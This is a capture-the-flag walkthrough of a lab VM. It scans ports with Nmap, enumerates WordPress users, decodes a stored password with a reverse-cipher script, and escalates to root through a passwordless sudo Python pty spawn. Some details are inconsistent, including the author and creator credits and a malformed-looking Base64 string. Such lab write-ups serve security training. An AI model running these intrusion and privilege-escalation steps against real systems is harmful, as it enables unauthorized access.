# BorkanCTF Walkthrough

## Overview
This document is a detailed walkthrough of the BorkanCTF, a Capture The Flag (CTF) challenge, authored by Belal Hamed. The walkthrough covers network scanning, web enumeration, database exploration, password cracking, and privilege escalation to achieve root access on the target system.

---

## Initial Reconnaissance

### Network Scanning with Nmap
The CTF begins with a network scan using Nmap to identify open ports and services on the target IP `192.168.1.14`.

```bash
nmap -sV 192.168.1.14
```

**Results:**
- **Port 22/tcp**: Open, running OpenSSH 6.7p1 Debian 5+deb8u6.
- **Port 80/tcp**: Open, running Apache httpd 2.4.10.
- **Port 3306/tcp**: Open, running MySQL 5.5.60-0+deb8u1.

Three open ports were identified, providing potential entry points for further exploration.

### Web Enumeration
Visiting `http://192.168.1.14` revealed no significant content. However, further exploration led to a WordPress installation at `http://192.168.1.14/wordpress/`.

#### WPScan for WordPress Enumeration
WPScan was used to enumerate the WordPress site:

```bash
wpscan --url http://192.168.1.14/wordpress/ --enumerate u
```

**Findings:**
- **WordPress Version**: 4.8.25 (Outdated, released on 2024-06-24).
- **Users Identified**:
  - `steven`
  - `michael`
- **Vulnerabilities**:
  - XML-RPC Pingback API exposed.
  - WP-Cron enabled, potentially vulnerable to DDoS.
  - Readme file accessible at `http://192.168.1.14/wordpress/readme.html`.

The identification of two users, `steven` and `michael`, provided targets for credential-based attacks.

---

## Gaining Initial Access

### SSH Attempt
An attempt to connect via SSH to `192.168.1.14` using the username `michael` was made. The password for `michael` was already known (not specified in the document), allowing successful login.

```bash
ssh michael@192.168.1.14
```

### Database Exploration
After gaining access, the MySQL database was explored:

```bash
mysql -u root -p
```

**Commands Executed:**
```sql
SHOW DATABASES;
```

The database `wordpress` was identified. Further inspection of the `users` table revealed a password hash for the user `steven`. However, attempts to crack this hash were unsuccessful, indicating it was either invalid or not relevant for `steven`'s SSH password.

---

## Password Decryption

### Discovering Steven's Password
The document includes a Python script that encrypts a string using a combination of Caesar cipher, XOR cipher, and text shifting, with the output encoded in Base64. The correct Base64 output was provided:

```
HRICGUFBSHYZUkhjH1tNSHoc5BCGSHOdRBxTehxIfR1TYR1aHEh5RRw
```

To retrieve `steven`'s password, a reverse decryption script was used:

```python
import base64

# Define constants
CORRECT_OUTPUT_BASE64 = "HRICGUFBSHYZUkhjH1tNSHoc5BCGSHOdRBxTehxIfR1TYR1aHEh5RRw"
XOR_KEY = 42
SHIFT_AMOUNT = 3

def caesar_cipher_reverse(text, shift):
    decrypted = ''.join(chr((ord(char) - shift) % 256) for char in text)
    return decrypted

def xor_cipher_reverse(text, key):
    decrypted = ''.join(chr(ord(char) ^ key) for char in text)
    return decrypted

def shift_text_reverse(text, shift_amount):
    shift_amount = shift_amount % len(text)
    decrypted = text[shift_amount:] + text[:shift_amount]
    return decrypted

def decrypt_encrypted_data(encrypted_base64):
    encrypted_input = base64.b64decode(encrypted_base64).decode()
    step1 = shift_text_reverse(encrypted_input, SHIFT_AMOUNT)
    step2 = xor_cipher_reverse(step1, XOR_KEY)
    final_decrypted = caesar_cipher_reverse(step2, SHIFT_AMOUNT)
    return final_decrypted

def main():
    decrypted_data = decrypt_encrypted_data(CORRECT_OUTPUT_BASE64)
    print("Decrypted_data:", decrypted_data)

if __name__ == "__main__":
    main()
```

**Output:**
```
Decrypted_data: OhhYou_F1nd_M3:)_T4k3_M3_TO_HOm3_Pl3453
```

This decrypted string was `steven`'s SSH password.

### SSH Access as Steven
Using the decrypted password, SSH access was gained as `steven`:

```bash
ssh steven@192.168.1.14
```

Password: `OhhYou_F1nd_M3:)_T4k3_M3_TO_HOm3_Pl3453`

---

## Privilege Escalation

### Checking Sudo Privileges
Once logged in as `steven`, the `sudo -l` command was used to check for sudo privileges:

```bash
sudo -l
```

**Result:**
- `steven` could run `python` as a sudoer without a password.

### Exploiting Python for Root Access
Using a privilege escalation technique from GTFOBins, a Python command was executed to spawn a root shell:

```bash
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

This command successfully launched a bash shell with root privileges:

```
root@Borkan:/home/steven#
```

### Retrieving the Root Flag
The root flag was found in `rootFlag.txt`:

```bash
cat rootFlag.txt
```

**Flag:**
```
flag5{Borkan"."s_off_NOw_Thanks_U_Sav3d_The_Gl0bE}
```

---

## Conclusion
The BorkanCTF was successfully completed by:
1. Scanning the network to identify open ports.
2. Enumerating a WordPress site to find usernames.
3. Gaining initial SSH access as `michael`.
4. Decrypting `steven`'s password using a provided encryption script.
5. Logging in as `steven` and escalating privileges to root using a Python exploit.
6. Retrieving the final flag.

**Acknowledgments:**
- The CTF creator, reachable at `@mccannw` on Twitter or via `wjmccann.github.io`.

This walkthrough demonstrates a comprehensive approach to solving a Boot2Root VM, combining network scanning, web enumeration, password cracking, and privilege escalation techniques.